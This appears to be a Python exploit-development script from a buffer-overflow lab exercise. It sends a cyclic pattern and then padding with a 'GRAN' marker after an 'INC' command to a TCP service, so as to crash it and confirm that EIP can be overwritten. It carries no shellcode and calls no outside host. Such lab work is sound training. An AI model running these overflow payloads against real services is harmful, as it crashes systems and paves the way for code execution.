#!/usr/bin/env python3
'''
This file asks the user to generate a cyclic pattern,
input it into the program (i hate coding python in RLES lol)
then sends to server. check using x86dbg.
'''
import socket
import sys

def find_eip_offset(host, port, pattern_size):
    """
    Send a cyclic pattern to find EIP offset
    """
    
    print("[*] Generating cyclic pattern of " + str(pattern_size) + " bytes")
    print("[*] Run this command to generate pattern:")
    print("    msf-pattern_create -l " + str(pattern_size))
    print()
    
    # you gotta paste the pattern here after running msf-pattern_create
    pattern = input("[*] Paste the pattern here: ")
    
    if len(pattern) == 0:
        print("[!] No pattern provided, exiting")
        sys.exit(1)
    
    print()
    print("[*] Connecting to " + host + ":" + str(port))
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        
        # recv banner
        banner = s.recv(1024)
        print("[*] Received banner: " + banner.decode().strip())
        
        # send the payload
        payload = b"INC " + pattern.encode() + b"\n"
        print("[*] Sending " + str(len(pattern)) + " byte pattern...")
        s.send(payload)
        
        # try to recv (prob wont work cuz crash)
        try:
            response = s.recv(1024)
            print("[*] Server responded: " + response.decode())
        except:
            print("[!] No response - server likely crashed")
        
        s.close()
        
        print()
        print("=" * 60)
        print("[*] Pattern sent successfully")
        print("[*] Now check EIP in x86dbg")
        print("[*] Once you have the EIP value, run:")
        print("    msf-pattern_offset -q <EIP_value> -l " + str(pattern_size))
        print("=" * 60)
        
    except Exception as e:
        print("[!] Error: " + str(e))
        sys.exit(1)

def test_eip_control(host, port, offset):
    """
    Test EIP control by writing 'GRAN' into it
    """
    
    print("[*] Testing EIP control with offset: " + str(offset))
    print("[*] Writing 'GRAN' to EIP...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        
        # recv banner
        banner = s.recv(1024)
        
        # build payload: padding + "GRAN"
        padding = b"A" * offset
        eip = b"GRAN"  
        
        payload = b"INC " + padding + eip + b"\n"
        print("[*] Sending payload (" + str(len(padding + eip)) + " bytes total)")
        s.send(payload)
        
        # prob crashes
        try:
            response = s.recv(1024)
        except:
            pass
        
        s.close()
        
        print()
        print("=" * 60)
        print("[*] Payload sent")
        print("[*] Check x86dbg - EIP should contain: 0x4e415247")
        print("[*] (that's 'GRAN' in hex, little-endian)")
        print("=" * 60)
        
    except Exception as e:
        print("[!] Error: " + str(e))

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage:")
        print("  Find offset:  " + sys.argv[0] + " <host> <port> find <pattern_size>")
        print("  Test offset:  " + sys.argv[0] + " <host> <port> test <offset>")
        print()
        print("Example:")
        print("  " + sys.argv[0] + " 192.168.1.100 2223 find 200")
        print("  " + sys.argv[0] + " 192.168.1.100 2223 test 24")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    if len(sys.argv) >= 4:
        mode = sys.argv[3]
        
        if mode == "find" and len(sys.argv) == 5:
            pattern_size = int(sys.argv[4])
            find_eip_offset(host, port, pattern_size)
        elif mode == "test" and len(sys.argv) == 5:
            offset = int(sys.argv[4])
            test_eip_control(host, port, offset)
        else:
            print("[!] Invalid arguments")
    else:
        print("[!] Not enough arguments")